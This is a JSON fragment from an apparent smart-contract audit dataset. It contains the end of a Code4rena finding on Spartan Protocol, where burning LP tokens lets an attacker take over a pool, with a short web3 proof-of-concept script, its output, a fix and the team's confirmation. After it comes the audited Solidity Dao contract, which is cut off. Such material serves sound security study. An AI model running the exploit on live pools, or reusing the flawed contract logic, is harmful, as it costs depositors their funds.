        "VulnerabilityDesc": [
            {
                "Name": "H-10",
                "Location": [
                    "//solidity\n// units = ((P (t B + T b))/(2 T B)) * slipAdjustment\n// P * (part1 + part2) / (part3) * slipAdjustment\nuint slipAdjustment = getSlipAdustment(b, B, t, T);\nuint part1 = t*(B);\nuint part2 = T*(b);\nuint part3 = T*(B)*(2);\nuint _units = (P * (part1 + (part2))) / (part3);\nreturn _units * slipAdjustment / one;  // Divide by 1018\n",
                    "//solidity\ndai_pool.functions.burn(init_amount-1).transact()\nprint('total supply', dai_pool.functions.totalSupply().call())\ndai.functions.transfer(dai_pool.address, 1000000 * 1018).transact()\ndai_pool.functions.addForMember(user).transact()\nprint('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call())\n",
                    "//solidity\ntotal supply 1\nlp received from depositing 1M dai:  0\n"
                ],
                "Type": " Hijack token pool by burning liquidity token",
                "Description": "\nPool allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).\n\nThe liquidity tokens are calculated at Utils:calcLiquidityUnits\nsolidity\n// units = ((P (t B + T b))/(2 T B)) * slipAdjustment\n// P * (part1 + part2) / (part3) * slipAdjustment\nuint slipAdjustment = getSlipAdustment(b, B, t, T);\nuint part1 = t*(B);\nuint part2 = T*(b);\nuint part3 = T*(B)*(2);\nuint _units = (P * (part1 + (part2))) / (part3);\nreturn _units * slipAdjustment / one;  // Divide by 1018\n\nwhere P stands for totalSupply of current Pool. If P is too small (e.g, 1) then all the units would be rounding to 0.\n\nSince any person can create a Pool at PoolFactory, hackers can create a Pool and burn his lp and set totalSupply to 1. He will be the only person who owns the Pool's lp from now on. Pool's burn logic(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146) and Utils' lp token formula(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80).\n\nHere's a script of a user depositing 1M token to a pool where totalSupply equals 1\n\nsolidity\ndai_pool.functions.burn(init_amount-1).transact()\nprint('total supply', dai_pool.functions.totalSupply().call())\ndai.functions.transfer(dai_pool.address, 1000000 * 1018).transact()\ndai_pool.functions.addForMember(user).transact()\nprint('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call())\n\n\nOutput:\nsolidity\ntotal supply 1\nlp received from depositing 1M dai:  0\n\n\n",
                "Repair": "Recommend removing burn or restrict it to privileged users only.\n\nverifyfirst (Spartan) confirmed(https://github.com/code-423n4/2021-07-spartan-findings/issues/38#issuecomment-883855367):\n  We agree to this issue and will restrict access to burn in the pool contract.\n We have already proposed adding a 1 week withdraw coolOff for all users per pool from the genesis of creation. Users can only add liquidity within this period.\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    }\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return 